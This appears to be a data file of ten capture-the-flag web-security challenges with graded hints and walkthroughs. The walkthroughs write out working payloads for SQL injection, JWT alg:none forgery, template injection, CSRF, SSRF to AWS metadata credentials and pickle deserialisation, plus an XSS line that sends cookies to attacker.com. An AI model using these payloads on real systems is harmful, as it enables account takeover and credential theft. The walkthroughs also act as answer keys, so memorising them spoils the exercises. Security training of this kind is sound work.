fields.name: C01 — Login Bypass Classic
fields.description: The login form passes user input directly into a raw SQL query. Find a way to authenticate as admin without knowing the password. The flag is in the admin panel.
fields.hint_cryptic: What happens if you break the SQL string context?
fields.hint_direct: SQL comments can terminate the rest of a query. Look up the -- operator.
fields.hint_walkthrough: Enter admin'-- as the username. This transforms the query to: SELECT * FROM users WHERE username='admin'-- AND password='...', commenting out the password check entirely.

fields.name: C02 — Cookie Monster
fields.description: The session cookie looks tampered with. Examine the cookie structure and modify it to escalate your privileges from user to admin.
fields.hint_cryptic: Cookies can store data in formats you can decode client-side.
fields.hint_direct: Base64 decode the session cookie. Look at the role field.
fields.hint_walkthrough: The cookie is a base64-encoded JSON object: {"user": "alice", "role": "user"}. Change role to admin, re-encode, and set the modified cookie.

fields.name: C03 — Reflected Glory
fields.description: The search endpoint reflects your input back into the page without sanitisation. Craft a payload that executes JavaScript and exfiltrates document.cookie.
fields.hint_cryptic: What if your search term contained HTML?
fields.hint_direct: Try: <script>alert(1)</script> in the search box. If it executes, steal the cookie.
fields.hint_walkthrough: Submit: <script>document.location='http://attacker.com/?c='+document.cookie</script> as the search query to exfiltrate cookies.

fields.name: C04 — Other People's Orders
fields.description: You are logged in as user #42. The /api/orders/ endpoint exists. Can you read order #43 — belonging to a different user?
fields.hint_cryptic: The order ID is in the URL. What if you changed it?
fields.hint_direct: Try GET /api/orders/43/ with your existing session cookie.
fields.hint_walkthrough: The API has no object-level permission check. GET /api/orders/43/ returns user_b's order data including the flag, despite you being user_a.

fields.name: C05 — None of Your Algorithm
fields.description: The app uses JWT for authentication. The flag is in the admin JWT payload. Bypass signature verification using the alg:none attack.
fields.hint_cryptic: JWT has three parts separated by dots. What does the first part control?
fields.hint_direct: The header contains the algorithm. What happens if you set it to 'none' and remove the signature?
fields.hint_walkthrough: Decode your JWT. Replace the header with {"alg":"none","typ":"JWT"}, change the payload role to admin, re-encode both with base64url (no padding), concatenate with dots and leave the signature empty: header.payload.

fields.name: C06 — Template Troubles
fields.description: The name parameter on the greeting page is rendered in a Jinja2 template without sanitisation. Extract the application SECRET_KEY from config.
fields.hint_cryptic: Template engines can evaluate expressions. What can you evaluate?
fields.hint_direct: Try {{7*7}} as input. If you see 49, you have SSTI. Then try {{config}}.
fields.hint_walkthrough: Submit {{config.items()}} to dump all Flask config variables including SECRET_KEY and the internal flag.

fields.name: C07 — Blind Date
fields.description: The login form returns no error details, but responds at different speeds. Use time-based blind SQL injection to extract the admin password hash character by character.
fields.hint_cryptic: What if you can't see query results but can measure time?
fields.hint_direct: SQLite has sqlite_sleep() — try: ' OR (SELECT CASE WHEN (1=1) THEN sqlite_sleep(2) ELSE 0 END)--
fields.hint_walkthrough: Use sqlmap with --technique=T and --level=3, or manually craft time-based payloads using CASE WHEN to binary-search each character of the password hash.

fields.name: C08 — Cross-Site Forgery Art
fields.description: Craft an HTML page that, when visited by a logged-in admin, silently transfers 1000 credits from their account to yours. No user interaction should be required.
fields.hint_cryptic: Forms can submit automatically on page load.
fields.hint_direct: An auto-submitting form with target action /transfer and hidden amount/recipient fields works if the site lacks CSRF tokens.
fields.hint_walkthrough: Create an HTML page with: <form method=POST action=/transfer><input name=amount value=1000><input name=to value=you></form><script>document.forms[0].submit()</script>

fields.name: C09 — Metadata Madness
fields.description: The image downloader fetches external URLs on your behalf. Probe the AWS metadata endpoint and retrieve the IAM role credentials.
fields.hint_cryptic: Cloud instances have a special IP range that provides metadata.
fields.hint_direct: Try submitting http://169.254.169.254/latest/meta-data/ as the image URL.
fields.hint_walkthrough: AWS IMDSv1 responds at 169.254.169.254. Chain: /latest/meta-data/iam/security-credentials/ to enumerate role names, then /latest/meta-data/iam/security-credentials/<ROLE_NAME> for the actual credentials.

fields.name: C10 — Pickle Rick
fields.description: The remember-me feature stores a serialised Python object in the cookie. Craft a Python Pickle payload that reads /etc/passwd from the server.
fields.hint_cryptic: Python's pickle module can execute arbitrary code on deserialisation.
fields.hint_direct: Override __reduce__ in a class to return an os.system call.
